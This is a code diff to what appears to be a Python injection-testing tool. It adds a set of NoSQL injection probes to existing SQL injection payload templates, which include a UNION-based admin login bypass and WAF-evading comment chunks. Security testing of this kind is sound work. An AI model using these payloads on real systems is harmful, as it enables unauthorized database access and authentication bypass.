@@ -79,6 +79,12 @@ PAYLOAD_TEMPLATES = {
         "\" or \"\"-\"",
         "1234' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
     ],
+    "nosql_probe": [
+        "' || '1'=='1",
+        "'; return true; var x='",
+        "' && this.password.match(/.*/) && '",
+        "true, $where: '1 == 1'",
+    ],
 }
 
 COMMENT_CHUNKS = ["/**/", "/*!*/", "/*!12345*/", "/*!99999*/", "/*+-*/"]
